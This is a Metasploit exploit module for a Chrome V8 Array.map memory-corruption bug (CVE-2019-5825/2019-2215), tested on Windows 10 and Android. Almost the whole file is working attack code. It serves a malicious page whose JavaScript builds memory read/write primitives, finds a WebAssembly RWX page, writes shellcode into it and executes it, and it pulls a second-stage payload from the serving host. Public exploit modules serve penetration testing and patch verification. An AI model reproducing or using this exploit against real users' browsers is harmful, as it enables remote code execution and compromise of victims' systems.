##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Chrome 72 Array.map exploit',
      'Description'    => %q{
        Chrome 73.0.3683.86 stable exploit for chromium issue 941743, tested on Windows 10 x64.
        start chrome with the --no-sandbox argument
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
          'IstvÃ¡n Kurucsai', # exploit
          'timwr', # metasploit module
        ],
      'References'     => [
          ['CVE', '2019-5825'],
          ['URL', 'https://github.com/exodusintel/Chromium-941743'],
          ['URL', 'https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/'],
        ],
      'Arch'           => [ ARCH_X64, ARCH_AARCH64 ],
      'Platform'       => ['windows','osx','linux','android'],
      'Payload'        => { 'Space' => 2048, },
      'DefaultTarget'  => 0,
      'Targets'        => [ [ 'Automatic', { } ] ],
      'DisclosureDate' => 'Mar 7 2019'))
    register_advanced_options([
      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information during exploitation", false]),
    ])
  end

  def on_request_uri(cli, request)

    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$}
      print_status("[*] " + request.body)
      send_response(cli, '')
      return
    end

    print_status("Sending #{request.uri} to #{request['User-Agent']}")

    if request.uri =~ %r{/exploit$}
      path = ::File.join Msf::Config.data_directory, 'exploits', 'CVE-2019-2215', 'exploit.aarch64'
      loader_data = ::File.binread path
      space = payload_space
      payload_encoded = payload.encoded
      loader_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good("Sent stage2 exploit ")
      return
    end

    path = ::File.join Msf::Config.data_directory, 'exploits', 'loader.aarch64'
    binary = ::File.binread path
    escaped_payload = Rex::Text.to_unescape(binary)
    html = %Q^
<html>
<head>
<script>

#{ datastore['DEBUG_EXPLOIT'] ? 'print = function(arg) {
  var request = new XMLHttpRequest();
  request.open("POST", "/print", false);
  request.send("" + arg);
};
' : '' }

// HELPER FUNCTIONS
let f64 = new Float64Array(1);
let bigint = new BigUint64Array(f64.buffer);
function f2i(v) {
  f64[0] = v;
  return bigint[0];
}
function i2f(i) {
  bigint[0] = i;
  return f64[0];
}
function hex(i) {
  return i.toString(16);
}

// *******************
// Exploit starts here
// *******************
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);

// we are aiming for the following object layout
// [output of Array.map][packed float array][typed array][Object]
// First the length of the packed float array is corrupted via the original vulnerability,
// then the float array can be used to modify the backing store of the typed array, thus achieving AARW.
// The Object at the end is used to implement addrof

// offset of the length field of the float array from the map output
const float_array_len_offset = 23;

// Set up a fast holey smi array, and generate optimized code.
var arr = [0, 0, ,,, 0];
var float_array;
var leak_array;
var leak_obj;

function mapping(a) {
  function cb(elem, idx) {
    if (idx == 0) {
      float_array = [0.1, 0.2];
      leak_array = new BigUint64Array(2);
      leak_array[0] = 0x41414141n;
      leak_array[1] = 0x42424242n;
      leak_obj = {'a': 0x31323334, 'b': 1};
      leak_obj['b'] = leak_obj;
    }

    if (idx > float_array_len_offset) {
      // minimize the corruption for stability
      throw "stop";
    }
    return idx;
  }
  return a.map(cb);
}

function exploit() {
  for (let i = 0; i < 10 ** 5; i++) {
    mapping(arr);
  }

  // Now lengthen the array, but ensure that it points to a non-dictionary
  // backing store.
  arr.length = (32 * 1024 * 1024)-1;
  arr.fill(1, float_array_len_offset);
  arr.length += 2;

  // Now, the non-inlined array constructor should produce an array with
  // dictionary elements: causing a crash.
  try {
    mapping(arr);
  } catch(e) {
  }

  print('len == ' + float_array.length);
  /*
  for (let i = 0x10; i < 0x40; i++) {
    //print("float_array[" + i + "] " + float_array[i]);
    //print("float_array[" + i + "] " + hex(f2i(float_array[i])));
  }
  */

  const arr_offset = 25;
  const addr_offset = 33;

  print("addr arr " + hex(f2i(float_array[arr_offset])));
  print("leak arr " + hex(f2i(float_array[27])));
  print("leak arr " + hex(f2i(float_array[28])));
  print("leak obj " + hex(f2i(float_array[32])));
  print("leak adr " + hex(f2i(float_array[addr_offset])));

  let memory = {
    addrof(obj) {
      leak_obj['b'] = obj;
      return f2i(float_array[addr_offset]);
    },
    read8(addr) {
      let original = float_array[arr_offset];
      float_array[arr_offset] = i2f(addr - 0x1fn);
      let result = leak_array[0];
      float_array[arr_offset] = original;
      return result;
    },
    write8(addr, value) {
      let original = float_array[arr_offset];
      float_array[arr_offset] = i2f(addr - 0x1fn);
      leak_array[0] = value;
      float_array[arr_offset] = original;
    }
  };

  /*
  print("addrof obj " + hex(memory.addrof(Object)));
  print("addrof obj " + hex(memory.addrof(float_array)));
  let addr_float = memory.addrof(float_array);

  let original_elements_ptr = f2i(float_array[arr_offset]) - 1n;
  print('original elements addr: ' + original_elements_ptr.toString(16));
  print('original elements value: ' + memory.read8(original_elements_ptr).toString(16));
  memory.write8(original_elements_ptr, 0x4141n);
  print('original elements value: ' + memory.read8(original_elements_ptr).toString(16));
  //print("read8 " + hex(memory.read8(addr_float)));
  */

  var req = new XMLHttpRequest();
  req.open('GET', "exploit", false);
  req.overrideMimeType('text\/plain; charset=x-user-defined');
  req.send(null);
  if (req.status != 200) {
    return;
  }

  let payload_size = req.responseText.length;
  let payload_array = new ArrayBuffer(payload_size);
  let payload8 = new Uint8Array(payload_array);
  for (let i = 0; i < req.responseText.length; i++) {
    payload8[i] = req.responseText.charCodeAt(i) & 0xff;
  }
  let payload_array_addr = memory.addrof(payload_array) + 31n;
  let payload_addr = memory.read8(payload_array_addr);
  var shellcode = unescape("#{escaped_payload}");

  function get_wasm_func() {
    var importObject = {
        imports: { imported_func: arg => console.log(arg) }
    };
    let bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
    let wasm_code = new Uint8Array(bc);
    let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
    return wasm_mod.exports.exported_func;
  }

  let wasm_func = get_wasm_func();
  let wasm_func_addr = memory.addrof(wasm_func) - 1n;
  print('wasm: ' + wasm_func_addr);
  if (wasm_func_addr == 2) {
    print('Failed, retrying...');
    location.reload();
    return;
  }
  let sfi = memory.read8(wasm_func_addr + 12n*2n) - 1n;
  print('sfi: ' + sfi.toString(16));
  let WasmExportedFunctionData = memory.read8(sfi + 4n*2n) - 1n;
  print('WasmExportedFunctionData: ' + WasmExportedFunctionData.toString(16));
  let instance = memory.read8(WasmExportedFunctionData + 8n*2n) - 1n;
  print('instance: ' + instance.toString(16));

  //let rwx_addr = memory.read8(instance + 0x108n);
  //let rwx_addr = memory.read8(instance + 0xf8n) + 0n; // Chrome/73.0.3683.86
  //let rwx_addr = memory.read8(instance + 0xe0n) + 18n; // Chrome/69.0.3497.100
  //let rwx_addr = memory.read8(memory.read8(instance - 0xc8n) + 0x53n); // Chrome/68.0.3440.84
  let rwx_ptr = memory.read8(instance - 0xc8n);
  print("rwx_ptr " + hex(rwx_ptr));
  let rwx_addr = memory.read8(rwx_ptr + 0x7fn); // Chrome/68.0.3440.14
  print('rwx: ' + rwx_addr.toString(16));
  // write the shellcode to the RWX page
  for (let i = 0; i < shellcode.length; i += 2) {
    var writeval = BigInt(shellcode.charCodeAt(i) + shellcode.charCodeAt(i + 1) * 0x10000);
    if (writeval == 0xdeadc0den) {
      writeval = payload_addr;
    } else if (writeval == 0xdead515en) {
      writeval = BigInt(payload_size);
    }
    memory.write8(rwx_addr + BigInt(i*2), writeval);
  }
  // invoke the shellcode
  wasm_func();
}

print("Exploiting...");
exploit();
</script>
</head>
<body>
</body>
</html>
    ^
    unless datastore['DEBUG_EXPLOIT']
      html.gsub!(/\/\/.*$/, '') # strip comments
      html.gsub!(/^\s*print\s*\(.*?\);\s*$/, '') # strip print(*);
    end
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
